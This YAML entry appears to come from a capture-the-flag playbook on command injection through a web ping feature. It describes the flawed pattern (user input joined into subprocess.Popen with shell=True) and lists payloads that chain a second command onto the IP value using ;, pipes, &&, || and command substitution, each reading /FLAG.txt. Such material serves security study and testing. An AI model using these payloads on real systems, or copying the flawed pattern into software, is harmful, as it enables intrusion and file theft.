name: command_injection_ping
category: web
tags: [command_injection, ping, shell, subprocess]
indicators:
  - "Ping functionality with user input"
  - "subprocess.Popen with shell=True"
  - "User input directly concatenated to command"
  - "No input sanitization"

tricks:
  - name: "Command injection via semicolon"
    when: "User input concatenated to shell command"
    how: "Use ; to separate commands"
    payload: |
      # Vulnerable code:
      # command = 'ping -c 2 ' + ip_address
      # subprocess.Popen(command, shell=True, ...)

      # Payload:
      ; cat /FLAG.txt

      # Result: ping -c 2 ; cat /FLAG.txt

  - name: "Alternative command injection payloads"
    when: "Semicolon might be filtered"
    how: "Use other shell operators"
    payload: |
      | cat /FLAG.txt       # pipe
      || cat /FLAG.txt      # or (if ping fails)
      && cat /FLAG.txt      # and (if ping succeeds)
      `cat /FLAG.txt`       # backticks
      $(cat /FLAG.txt)      # command substitution
